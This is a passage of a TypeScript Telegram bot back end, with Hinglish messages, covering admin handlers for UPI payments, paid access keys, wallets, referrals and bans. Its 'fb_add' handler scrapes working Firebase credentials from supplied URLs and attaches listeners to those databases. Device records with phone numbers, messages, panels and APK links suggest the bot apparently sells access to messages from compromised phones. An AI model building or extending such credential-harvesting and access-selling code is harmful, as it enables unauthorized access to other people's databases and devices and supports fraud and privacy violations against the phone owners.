          `👆 QR scan karo ya UPI ID pe payment karo.\n\n*Payment karne ke baad UTR/Reference number bhejo.*`,
        parse_mode: "Markdown",
      });
      break;
    }

    case "pay_utr": {
      const utr = text.replace(/\s/g, "");
      if (utr.length < 6) { await b.sendMessage(chatId, "❌ Valid UTR number bhejo."); return; }
      pendingInputs.set(chatId, { type: "pay_screenshot", data: { ...pending.data, utr } });
      await b.sendMessage(chatId, "📸 *Payment Screenshot bhejo:*\n\nApne payment app se screenshot le ke yahan send karo.", { parse_mode: "Markdown" });
      break;
    }

    case "pay_screenshot": {
      const fileId = text;
      const amount = pending.data?.amount as number;
      const utr = pending.data?.utr as string;
      const [req] = await db.insert(paymentRequestsTable)
        .values({ chatId, amount, utrNumber: utr, screenshotFileId: fileId }).returning();
      await b.sendMessage(chatId,
        `✅ *Request Received!*\n\n💰 Amount: ₹${amount}\n📋 UTR: \`${utr}\`\n\nAdmin verify kar ke approve karega. Usually 5-15 min lagte hain.`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "💰 Wallet", callback_data: "wallet_menu" }]] } }
      );
      const adminText = `💳 *New Payment Request #${req.id}*\n\n👤 User: \`${chatId}\`\n💰 Amount: *₹${amount}*\n📋 UTR: \`${utr}\`\n🕐 ${formatDate(new Date())}`;
      const adminKb = [[{ text: "✅ Approve", callback_data: `payapprove_${req.id}` }, { text: "❌ Reject", callback_data: `payreject_${req.id}` }]];
      for (const adminId of adminChatIds) {
        await b.sendPhoto(adminId, fileId, { caption: adminText, parse_mode: "Markdown", reply_markup: { inline_keyboard: adminKb } })
          .catch(() => b.sendMessage(adminId, adminText, { parse_mode: "Markdown", reply_markup: { inline_keyboard: adminKb } }));
      }
      break;
    }

    case "set_upi": {
      await setSetting("upi_id", text);
      await b.sendMessage(chatId, `✅ UPI ID set: \`${text}\``, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "set_welcome": {
      if (text.toLowerCase() === "delete") {
        await db.delete(botSettingsTable).where(eq(botSettingsTable.key, "welcome_message"));
        await b.sendMessage(chatId, "✅ Welcome message deleted (default restored).", { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      } else {
        await setSetting("welcome_message", text);
        await b.sendMessage(chatId, `✅ Welcome message updated!`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      }
      break;
    }

    case "plan_label":
      pendingInputs.set(chatId, { type: "plan_hours", data: { label: text } });
      await b.sendMessage(chatId, `⏱ "${text}" ke liye kitne ghante/coins? (key plan ke liye hours, coin plan ke liye coins mein):`);
      break;

    case "plan_hours": {
      const hours = parseInt(text);
      if (isNaN(hours) || hours <= 0) { await b.sendMessage(chatId, "❌ Valid number bhejo."); return; }
      pendingInputs.set(chatId, { type: "plan_price", data: { ...pending.data, hours } });
      await b.sendMessage(chatId, "💰 Is plan ki price kitni hogi (rupees)?");
      break;
    }

    case "plan_price": {
      const price = parseInt(text);
      if (isNaN(price) || price < 0) { await b.sendMessage(chatId, "❌ Valid price bhejo."); return; }
      const label = pending.data?.label as string;
      const hours = pending.data?.hours as number;
      await db.insert(keyPlansTable).values({ label, durationHours: hours, price });
      await b.sendMessage(chatId, `✅ *Plan Added!*\n\n*${label}* — ${hours}h/coins | ₹${price}`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🗝 Key Plans", callback_data: "adm_plans" }]] } }
      );
      break;
    }

    case "fb_add": {
      const urls = text.split("\n").map((u) => u.trim()).filter((u) => u.startsWith("http"));
      if (!urls.length) { await b.sendMessage(chatId, "❌ No valid URLs found."); return; }
      await b.sendMessage(chatId, `⏳ Processing ${urls.length} URL(s)...`);
      const { addFirebaseUrl } = await import("../firebase/listener.js");
      const { findWorkingFirebaseCreds } = await import("../firebase/universal-scraper.js");
      const { startZxkaiListener } = await import("../firebase/clients-listener.js");
      let success = 0;
      for (const url of urls) {
        try {
          if (url.includes("firebaseio.com")) { await addFirebaseUrl(url); success++; }
          else {
            const creds = await findWorkingFirebaseCreds(url);
            for (const c of creds) {
              await startZxkaiListener({ firebaseUrl: c.url, apiKey: c.key });
              await db.insert(firebaseConfigsTable).values({ url: `zxkai::${c.url}::${c.key}`, label: new URL(url).hostname }).onConflictDoNothing();
              success++;
            }
            if (!creds.length) await addFirebaseUrl(url).catch(() => {});
          }
        } catch (e) { logger.error({ e, url }, "Failed to add URL"); }
      }
      await b.sendMessage(chatId, `✅ Connected ${success}/${urls.length} source(s).`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "apk_label": pendingInputs.set(chatId, { type: "apk_url", data: { label: text } }); await b.sendMessage(chatId, "📎 APK URL bhejo:"); break;
    case "apk_url": {
      await db.insert(apkLinksTable).values({ label: pending.data?.label as string, url: text });
      await b.sendMessage(chatId, `✅ APK link added.`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }
    case "web_panel_label":
      pendingInputs.set(chatId, { type: "web_panel_price", data: { label: text } });
      await b.sendMessage(chatId, "💰 Web panel ki price bhejo (rupees mein):");
      break;
    case "web_panel_price": {
      const price = parseInt(text, 10);
      if (!Number.isInteger(price) || price < 1) {
        await b.sendMessage(chatId, "❌ Price ₹1 ya usse zyada bhejo, jaise: 99");
        return;
      }
      pendingInputs.set(chatId, { type: "web_panel_instructions", data: { ...pending.data, price } });
      await b.sendMessage(chatId, "📖 User ke liye instructions bhejo:");
      break;
    }
    case "web_panel_instructions":
      pendingInputs.set(chatId, { type: "web_panel_url", data: { ...pending.data, instructions: text } });
      await b.sendMessage(chatId, "🔗 User ko approval ke baad jo panel link milega, woh http:// ya https:// URL bhejo:");
      break;
    case "web_panel_url": {
      if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); break; }
      const url = normalizeHttpUrl(text);
      if (!url) {
        pendingInputs.set(chatId, { type: "web_panel_url", data: pending.data });
        await b.sendMessage(chatId, "❌ Valid http:// ya https:// URL bhejo. Purchase link isi URL par set hoga:");
        break;
      }
      pendingInputs.set(chatId, { type: "web_panel_image", data: { ...pending.data, url } });
      await b.sendMessage(chatId, "🖼 Ab web panel ki image/photo bhejo:");
      break;
    }
    case "web_panel_update_url": {
      if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); break; }
      const url = normalizeHttpUrl(text);
      if (!url) {
        pendingInputs.set(chatId, { type: "web_panel_update_url", data: pending.data });
        await b.sendMessage(chatId, "❌ Valid http:// ya https:// URL bhejo:");
        break;
      }
      const panelId = Number(pending.data?.panelId);
      if (!Number.isInteger(panelId) || panelId < 1) {
        await b.sendMessage(chatId, "❌ Web panel identify nahi ho paya. Admin panel se dobara try karo.");
        break;
      }
      const [updated] = await db.update(webPanelsTable)
        .set({ url })
        .where(eq(webPanelsTable.id, panelId))
        .returning({ id: webPanelsTable.id });
      if (!updated) {
        await b.sendMessage(chatId, "❌ Web panel nahi mila. List refresh karke dobara try karo.");
        break;
      }
      await b.sendMessage(chatId, "✅ Web panel ka purchase link set/update ho gaya.", {
        reply_markup: { inline_keyboard: [[{ text: "🖥 Web Panels", callback_data: "adm_web_panels" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
      });
      break;
    }
    case "web_panel_image": {
      await db.insert(webPanelsTable).values({
        label: pending.data?.label as string,
        price: Number(pending.data?.price ?? 0),
        instructions: pending.data?.instructions as string,
        url: pending.data?.url as string,
        imageFileId: text,
      });
      await b.sendMessage(chatId, "✅ Web panel add ho gaya.", {
        reply_markup: { inline_keyboard: [[{ text: "🖥 Web Panels", callback_data: "adm_web_panels" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
      });
      break;
    }
    case "link_label": pendingInputs.set(chatId, { type: "link_url", data: { label: text } }); await b.sendMessage(chatId, "🔗 URL bhejo:"); break;
    case "link_url": {
      await db.insert(botLinksTable).values({ label: pending.data?.label as string, url: text });
      await b.sendMessage(chatId, `✅ Link added.`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "qr_label": pendingInputs.set(chatId, { type: "qr_data", data: { label: text } }); await b.sendMessage(chatId, "📋 QR ke liye URL/Text bhejo:"); break;
    case "qr_data": {
      await db.insert(qrItemsTable).values({ label: pending.data?.label as string, data: text });
      const qrBuf = await qrcode.toBuffer(text, { type: "png", width: 400 });
      await b.sendPhoto(chatId, qrBuf, { caption: `✅ QR saved.`, reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "broadcast": {
      if (text.length < 1 || text.length > 4096) {
        await b.sendMessage(chatId, "❌ Message 1–4096 characters ka hona chahiye.");
        break;
      }
      const recipients = await getRegisteredUserIds();
      let sent = 0;
      let failed = 0;
      let blocked = 0;
      for (const recipient of recipients) {
        try {
          await b.sendMessage(recipient, text);
          sent++;
        } catch (err) {
          const statusCode = typeof err === "object" && err !== null && "response" in err
            ? Number((err as { response?: { statusCode?: number } }).response?.statusCode)
            : 0;
          if (statusCode === 403) blocked++;
          else failed++;
        }
        await new Promise((resolve) => setTimeout(resolve, 60));
      }
      await b.sendMessage(chatId,
        `📢 *Broadcast Complete*\n\nTotal: ${recipients.length}\n✅ Sent: ${sent}\n❌ Failed: ${failed}\n🚫 Blocked: ${blocked}`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } },
      );
      break;
    }

    case "flash_duration": {
      const hours = parseInt(text, 10);
      if (!Number.isInteger(hours) || hours <= 0 || hours > 24 * 30) {
        await b.sendMessage(chatId, "❌ Duration 1–720 hours ke beech bhejo.");
        break;
      }
      pendingInputs.set(chatId, { type: "flash_required", data: { hours } });
      await b.sendMessage(chatId, "⚡ Challenge ke liye kitne verified referrals required hain?");
      break;
    }
    case "flash_required": {
      const required = parseInt(text, 10);
      if (!Number.isInteger(required) || required <= 0) {
        await b.sendMessage(chatId, "❌ Required referrals 1 ya usse zyada hone chahiye.");
        break;
      }
      pendingInputs.set(chatId, { type: "flash_bonus", data: { hours: pending.data?.hours, required } });
      await b.sendMessage(chatId, "🎁 Challenge complete hone par kitne bonus minutes dene hain?");
      break;
    }
    case "flash_bonus": {
      const bonusMinutes = parseInt(text, 10);
      if (!Number.isInteger(bonusMinutes) || bonusMinutes <= 0 || bonusMinutes > 24 * 60) {
        await b.sendMessage(chatId, "❌ Bonus 1–1440 minutes ke beech bhejo.");
        break;
      }
      const startedAt = Date.now();
      const hours = Number(pending.data?.hours);
      const requiredReferrals = Number(pending.data?.required);
      await setSetting("flash_challenge", JSON.stringify({
        startedAt,
        expiresAt: startedAt + hours * 60 * 60 * 1000,
        requiredReferrals,
        bonusMinutes,
      }));
      await b.sendMessage(chatId,
        `✅ *Flash Challenge Active!*\n\n⏱ Duration: ${hours} hours\n👥 Required: ${requiredReferrals} verified referrals\n🎁 Bonus: ${bonusMinutes} minutes`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } },
      );
      break;
    }

    case "public_minutes": {
      const minutes = parseInt(text, 10);
      if (!Number.isInteger(minutes) || minutes <= 0 || minutes > 24 * 60 * 30) {
        await b.sendMessage(chatId, "❌ Minutes 1–43200 ke beech hone chahiye.");
        break;
      }
      pendingInputs.set(chatId, { type: "public_limit", data: { minutes } });
      await b.sendMessage(chatId, "🔓 Ye public key maximum kitne users use kar sakte hain?");
      break;
    }
    case "public_limit": {
      const maxUsers = parseInt(text, 10);
      if (!Number.isInteger(maxUsers) || maxUsers <= 0) {
        await b.sendMessage(chatId, "❌ User limit 1 ya usse zyada hona chahiye.");
        break;
      }
      const keyCode = await generateUniqueKey("PUB");
      await setSetting(`public_key_${keyCode}`, JSON.stringify({
        minutes: Number(pending.data?.minutes),
        maxUsers,
        usedUsers: [],
        createdAt: Date.now(),
      }));
      await b.sendMessage(chatId,
        `✅ *Public Key Created*\n\n🔑 \`${keyCode}\`\n⏱ Access: ${pending.data?.minutes} minutes\n👥 Maximum users: ${maxUsers}\n\nUsers use: /redeem ${keyCode}`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } },
      );
      break;
    }

    case "paid_minutes": {
      const minutes = parseInt(text, 10);
      if (!Number.isInteger(minutes) || minutes <= 0 || minutes > 24 * 60 * 30) {
        await b.sendMessage(chatId, "❌ Minutes 1–43200 ke beech hone chahiye.");
        break;
      }
      pendingInputs.set(chatId, { type: "paid_price", data: { minutes } });
      await b.sendMessage(chatId, "💳 Paid key ki price kitni hogi (rupees)?");
      break;
    }
    case "paid_price": {
      const price = parseInt(text, 10);
      if (!Number.isInteger(price) || price <= 0) {
        await b.sendMessage(chatId, "❌ Paid key price 1 ya usse zyada honi chahiye.");
        break;
      }
      pendingInputs.set(chatId, { type: "paid_limit", data: { minutes: pending.data?.minutes, price } });
      await b.sendMessage(chatId, "💳 Ye paid key maximum kitne users use kar sakte hain?");
      break;
    }
    case "paid_limit": {
      const maxUsers = parseInt(text, 10);
      if (!Number.isInteger(maxUsers) || maxUsers <= 0) {
        await b.sendMessage(chatId, "❌ User limit 1 ya usse zyada hona chahiye.");
        break;
      }
      const keyCode = await generateUniqueKey("PAID");
      await setSetting(`paid_key_${keyCode}`, JSON.stringify({
        minutes: Number(pending.data?.minutes),
        maxUsers,
        usedUsers: [],
        createdAt: Date.now(),
      }));
      await setSetting(`paid_key_price_${keyCode}`, String(pending.data?.price));
      await b.sendMessage(chatId,
        `✅ *Paid Key Created*\n\n🔑 \`${keyCode}\`\n⏱ Access: ${pending.data?.minutes} minutes\n💰 Price per use: ₹${pending.data?.price}\n👥 Maximum users: ${maxUsers}\n\nUsers use: /redeem ${keyCode}`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } },
      );
      break;
    }

    case "key_minutes": {
      const minutes = parseInt(text, 10);
      if (!Number.isInteger(minutes) || minutes <= 0 || minutes > 24 * 60 * 30) {
        await b.sendMessage(chatId, "❌ Minutes 1–43200 ke beech hone chahiye.");
        break;
      }
      const keyCode = await generateUniqueKey("FREE");
      await db.insert(accessKeysTable).values({
        keyCode,
        durationHours: Math.ceil(minutes / 60),
        price: 0,
      });
      await setSetting(`free_key_minutes_${keyCode}`, String(minutes));
      await b.sendMessage(chatId,
        `✅ *Free Key Created*\n\n🔑 \`${keyCode}\`\n⏱ Access: ${minutes} minutes\n\nUser ko do: /redeem ${keyCode}`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } },
      );
      break;
    }

    case "key_hours": {
      const hours = parseInt(text);
      if (isNaN(hours) || hours <= 0) { await b.sendMessage(chatId, "❌ Invalid hours."); return; }
      pendingInputs.set(chatId, { type: "key_price", data: { hours } });
      await b.sendMessage(chatId, "💰 Price bhejo (0 for free):");
      break;
    }
    case "key_price": {
      const price = parseInt(text);
      if (isNaN(price) || price < 0) { await b.sendMessage(chatId, "❌ Invalid price."); return; }
      const hours = pending.data?.hours as number;
      const keyCode = randomBytes(6).toString("hex").toUpperCase();
      await db.insert(accessKeysTable).values({ keyCode, durationHours: hours, price });
      await b.sendMessage(chatId, `✅ *Key Created!*\n\`${keyCode}\`\n⏱ ${hours}h | ₹${price}\n\nUser ko do: /redeem ${keyCode}`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } }
      );
      break;
    }

    case "check_user": {
      const [ua, wallet, coins] = await Promise.all([
        db.select().from(userAccessTable).where(eq(userAccessTable.chatId, text)).then((r) => r[0]),
        getBalance(text),
        getCreditCoins(text),
      ]);
      const active = ua && ua.expiresAt > new Date();
      const banned = await isBanned(text);
      await b.sendMessage(chatId,
        `👤 *User Info: \`${text}\`*\n\n` +
        `Key Access: ${active ? `✅ till ${formatDate(ua!.expiresAt)}` : "❌ None"}\n` +
        `💰 Wallet: ₹${wallet}\n` +
        `🪙 Credit Coins: ${coins}\n` +
        `🚫 Status: ${banned ? "BANNED" : "Active"}`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: banned ? "✅ Unban" : "🚫 Ban", callback_data: banned ? `unban_${text}` : `ban_${text}` }],
              [{ text: "🔙 Admin Menu", callback_data: "adm_menu" }],
            ],
          },
        }
      );
      break;
    }

    case "search_number": {
      const query = text.trim();
      const allDevices = await db.select().from(devicesTable)
        .where(isNotNull(devicesTable.phoneNumber))
        .orderBy(desc(devicesTable.isOnline), desc(devicesTable.lastSeen));
      const matches = allDevices
        .filter(d => isValidPhoneNumber(d.phoneNumber) && (d.phoneNumber ?? d.deviceId).includes(query))
        .sort((a, b) => Number(b.isOnline) - Number(a.isOnline) || (b.lastSeen?.getTime() ?? 0) - (a.lastSeen?.getTime() ?? 0));
      if (!matches.length) {
        await b.sendMessage(chatId, `🔍 No matches for "${query}"`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "nums_0" }]] } });
        return;
      }
      const keyboard: InlineKeyboardButton[][] = matches.slice(0, 20).map(d => [{
        text: `📱 ${shortPhone(d)} 🟢`,
        callback_data: `dev_${d.id}`,
      }]);
      keyboard.push([{ text: "🔙 Back", callback_data: "nums_0" }]);
      await b.sendMessage(chatId, `🔍 *Results for "${query}" (${matches.length}):*`, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      });
      break;
    }

    case "ban_user": {
      await setSetting(`ban_${text}`, "1");
      // Invalidate user's keys by clearing access cache
      invalidateAccess(text);
      await b.sendMessage(chatId, `🚫 User \`${text}\` banned!\n\nAll their services blocked.`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      // Notify user
      b.sendMessage(text, "🚫 You have been banned from this bot.").catch(() => {});
      break;
    }

    case "unban_user": {
      await setSetting(`ban_${text}`, "0");
      await b.sendMessage(chatId, `✅ User \`${text}\` unbanned!`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      b.sendMessage(text, "✅ You have been unbanned. Use /start to continue.").catch(() => {});
      break;
    }

    case "admin_add_money_id":
      pendingInputs.set(chatId, { type: "admin_add_money_amt", data: { userId: text } });
      await b.sendMessage(chatId, `💸 \`${text}\` ko kitna money add karna hai?`);
      break;
    case "admin_add_money_amt": {
      const amt = parseInt(text);
      if (isNaN(amt) || amt <= 0) { await b.sendMessage(chatId, "❌ Invalid amount."); return; }
      const userId = pending.data?.userId as string;
      const newBal = await creditWallet(userId, amt);
      await b.sendMessage(chatId, `✅ ₹${amt} added to \`${userId}\`\nNew balance: ₹${newBal}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      b.sendMessage(userId, `💰 *Admin ne ₹${amt} add kiya!*\nNew Balance: ₹${newBal}`, { parse_mode: "Markdown" }).catch(() => {});
      break;
    }

    case "admin_deduct_money_id":
      pendingInputs.set(chatId, { type: "admin_deduct_money_amt", data: { userId: text } });
      await b.sendMessage(chatId, `💸 \`${text}\` se kitna deduct karna hai?`);
      break;
    case "admin_deduct_money_amt": {
      const amt = parseInt(text);
      if (isNaN(amt) || amt <= 0) { await b.sendMessage(chatId, "❌ Invalid amount."); return; }
      const userId = pending.data?.userId as string;
      const { ok, balance } = await debitWallet(userId, amt);
      if (!ok) { await b.sendMessage(chatId, `❌ Insufficient balance. User has ₹${balance}`); return; }
      await b.sendMessage(chatId, `✅ ₹${amt} deducted from \`${userId}\`\nNew balance: ₹${balance - amt}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "admin_add_coins_id":
      pendingInputs.set(chatId, { type: "admin_add_coins_amt", data: { userId: text } });
      await b.sendMessage(chatId, `🪙 \`${text}\` ko kitne coins add karne hai?`);
      break;
    case "admin_add_coins_amt": {
      const amt = parseInt(text);
      if (isNaN(amt) || amt <= 0) { await b.sendMessage(chatId, "❌ Invalid amount."); return; }
      const userId = pending.data?.userId as string;
      const cur = await getCreditCoins(userId);
      await setCreditCoins(userId, cur + amt);
      await b.sendMessage(chatId, `✅ ${amt} coins added to \`${userId}\`\nNew coins: ${cur + amt}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      b.sendMessage(userId, `🪙 *Admin ne ${amt} coins add kiye!*\nTotal Coins: ${cur + amt}`, { parse_mode: "Markdown" }).catch(() => {});
      break;
    }

    case "admin_deduct_coins_id":
      pendingInputs.set(chatId, { type: "admin_deduct_coins_amt", data: { userId: text } });
      await b.sendMessage(chatId, `🪙 \`${text}\` se kitne coins deduct karne hai?`);
      break;
    case "admin_deduct_coins_amt": {
      const amt = parseInt(text);
      if (isNaN(amt) || amt <= 0) { await b.sendMessage(chatId, "❌ Invalid amount."); return; }
      const userId = pending.data?.userId as string;
      const cur = await getCreditCoins(userId);
      if (cur < amt) { await b.sendMessage(chatId, `❌ User ke paas sirf ${cur} coins hain.`); return; }
      await setCreditCoins(userId, cur - amt);
      await b.sendMessage(chatId, `✅ ${amt} coins deducted from \`${userId}\`\nNew coins: ${cur - amt}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "admin_add_refer_id":
      pendingInputs.set(chatId, { type: "admin_add_refer_hours", data: { userId: text } });
      await b.sendMessage(chatId, `🔑 \`${text}\` ko kitne ghante ka access add karna hai?`);
      break;
    case "admin_add_refer_hours": {
      const hours = parseInt(text);
      if (isNaN(hours) || hours <= 0) { await b.sendMessage(chatId, "❌ Invalid hours."); return; }
      const userId = pending.data?.userId as string;
      const expiresAt = await grantAccessForHours(userId, hours);
      await b.sendMessage(chatId, `✅ ${hours}h access added to \`${userId}\`\nExpires: ${formatDate(expiresAt)}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      b.sendMessage(userId, `🎁 *Admin ne ${hours}h access diya!*\nExpires: ${formatDate(expiresAt)}`, { parse_mode: "Markdown" }).catch(() => {});
      break;
    }

    case "admin_deduct_refer_id":
      pendingInputs.set(chatId, { type: "admin_deduct_refer_hours", data: { userId: text } });
      await b.sendMessage(chatId, `🔑 \`${text}\` ka kitne ghante ka access deduct karna hai?`);
      break;
    case "admin_deduct_refer_hours": {
      const hours = parseInt(text);
      if (isNaN(hours) || hours <= 0) { await b.sendMessage(chatId, "❌ Invalid hours."); return; }
      const userId = pending.data?.userId as string;
      const [ua] = await db.select().from(userAccessTable).where(eq(userAccessTable.chatId, userId));
      if (!ua || ua.expiresAt <= new Date()) { await b.sendMessage(chatId, "❌ User ka koi active access nahi."); return; }
      const newExpiry = new Date(ua.expiresAt.getTime() - hours * 60 * 60 * 1000);
      await db.update(userAccessTable).set({ expiresAt: newExpiry }).where(eq(userAccessTable.chatId, userId));
      invalidateAccess(userId);
      await b.sendMessage(chatId, `✅ ${hours}h deducted from \`${userId}\`\nNew expiry: ${formatDate(newExpiry)}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      break;
    }

    case "remove_number": {
      if (chatId !== PRIMARY_ADMIN_ID) {
        await b.sendMessage(chatId, "❌ Admin only.");
        return;
      }

      const input = text.trim();
      const query = normalizePhoneNumber(input);

      const allDevices = await db.select().from(devicesTable);

      const matches = allDevices.filter((device) => {
        const deviceIdMatch = device.deviceId === input;
        const phone = normalizePhoneNumber(device.phoneNumber ?? "");
        const numberMatch =
          query.length >= 10 &&
          phone.length >= 10 &&
          phone.slice(-10) === query.slice(-10);

        return deviceIdMatch || numberMatch;
      });

      if (!matches.length) {
        await b.sendMessage(chatId, "❌ Number/Device ID nahi mila. Kuch delete nahi hua.", {
          reply_markup: {
            inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]],
          },
        });
        return;
      }

      const { removeFirebaseNumber } = await import("../firebase/listener.js");
      const removed: string[] = [];
      const failed: string[] = [];

      for (const device of matches) {
        const [panel] = await db
          .select()
          .from(panelsTable)
          .where(eq(panelsTable.id, device.panelId));

        try {
          if (panel?.firebaseUrl) {
            await removeFirebaseNumber({
              firebaseUrl: panel.firebaseUrl,
              panelName: panel.name,
              deviceId: device.deviceId,
            });
          }

          await db
            .delete(messagesTable)
            .where(eq(messagesTable.deviceId, device.id));

          await db
            .delete(devicesTable)
            .where(eq(devicesTable.id, device.id));

          removed.push(device.phoneNumber ?? device.deviceId);
        } catch {
          failed.push(device.phoneNumber ?? device.deviceId);
        }
      }

      notifyNumbersChanged();

      const result = removed.length
        ? "✅ Permanently removed:\n" + removed.join("\n")
        : "❌ Number remove nahi hua.";

      const errorText = failed.length
        ? "\n\n⚠️ Failed:\n" + failed.join("\n")
        : "";

      await b.sendMessage(chatId, result + errorText, {
        reply_markup: {
          inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]],
        },
      });
      break;
    }

    case "random_remove_count": {
      const amount = parseInt(text, 10);
      if (!Number.isInteger(amount) || amount <= 0) {
        await b.sendMessage(chatId, "❌ 1 ya usse zyada valid number bhejo.");
        return;
      }
      const { devices } = await getCachedOrFetch(true);
      if (amount > devices.length) {
        await b.sendMessage(chatId, `❌ Sirf ${devices.length} listed numbers available hain. Itne hi ya kam numbers bhejo.`);
        return;
      }
      const selectedIds = randomSubset(devices.map((device) => device.id), amount);
      await Promise.all(selectedIds.map((id) =>
        db.update(devicesTable).set({ isListed: false }).where(eq(devicesTable.id, id))
      ));
      await refreshNumberVisibility();
      await b.sendMessage(chatId, `🎲 ${amount} numbers randomly hide kar diye gaye. Ye database se delete nahi hue; Random Add se wahi hidden pool restore hoga.`, {
        reply_markup: { inline_keyboard: [[{ text: "🎛 Number Control", callback_data: "adm_number_control" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
      });
      break;
    }

    case "random_add_count": {
      const amount = parseInt(text, 10);
      if (!Number.isInteger(amount) || amount <= 0) {
        await b.sendMessage(chatId, "❌ 1 ya usse zyada valid number bhejo.");
        return;
      }
      const hiddenIds = await getHiddenNumberIds();
      if (amount > hiddenIds.length) {
        await b.sendMessage(chatId, `❌ Sirf ${hiddenIds.length} hidden numbers available hain. Itne hi ya kam numbers bhejo.`);
        return;
      }
      const selectedIds = randomSubset(hiddenIds, amount);
      await Promise.all(selectedIds.map((id) =>
        db.update(devicesTable).set({ isListed: true }).where(eq(devicesTable.id, id))
      ));
      await refreshNumberVisibility();
      await b.sendMessage(chatId, `✅ ${amount} hidden numbers randomly user-list me wapas add kar diye gaye.`, {
        reply_markup: { inline_keyboard: [[{ text: "🎛 Number Control", callback_data: "adm_number_control" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
      });
      break;
    }

    case "add_admin": {
      adminChatIds.add(text);
      const current = await getSetting("admin_ids").catch(() => "");
      const ids = current ? current.split(",").filter(Boolean) : [];
      if (!ids.includes(text)) {
        ids.push(text);
        await setSetting("admin_ids", ids.join(","));
      }
      await b.sendMessage(chatId, `✅ Admin added: \`${text}\``, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } });
      b.sendMessage(text, "👑 You have been added as admin! Use /admin to access panel.").catch(() => {});
      break;
    }

    case "set_coin_cost": {
      const cost = parseInt(text);
      if (isNaN(cost) || cost < 0) { await b.sendMessage(chatId, "❌ Invalid value."); return; }
      await setSetting("coin_cost_per_number", String(cost));
      await b.sendMessage(chatId, `✅ Coin cost per number: ${cost}`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Settings", callback_data: "adm_settings" }]] } });
      break;
    }

    case "set_credit_dur": {
      const dur = parseInt(text);
      if (isNaN(dur) || dur < 5) { await b.sendMessage(chatId, "❌ Minimum 5 seconds."); return; }
      await setSetting("credit_access_duration", String(dur));
      await b.sendMessage(chatId, `✅ Credit access duration: ${dur}s`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Settings", callback_data: "adm_settings" }]] } });
      break;
    }

    case "set_refer_target": {
      const target = parseInt(text);
      if (isNaN(target) || target < 1) { await b.sendMessage(chatId, "❌ Minimum 1."); return; }
      await setSetting("refer_target", String(target));
      await b.sendMessage(chatId, `✅ Refer target: ${target} referrals`, { reply_markup: { inline_keyboard: [[{ text: "🔙 Settings", callback_data: "adm_settings" }]] } });
      break;
    }

    case "set_refer_reward": {
      const minutes = parseInt(text, 10);
      if (!Number.isInteger(minutes) || minutes <= 0 || minutes > 24 * 60 * 30) {
        await b.sendMessage(chatId, "❌ Target reward 1–43200 minutes ke beech hona chahiye.");
        break;
      }
      await setSetting("refer_reward_minutes", String(minutes));
      await b.sendMessage(chatId, `✅ Target completion reward: ${minutes} minutes`, {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Settings", callback_data: "adm_settings" }]] },
      });
      break;
    }

    case "set_refer_extra": {
      const values = parseMinuteList(text);
      if (!values.length) {
        await b.sendMessage(chatId, "❌ Comma-separated valid minutes bhejo. Example: 5,10,12");
        break;
      }
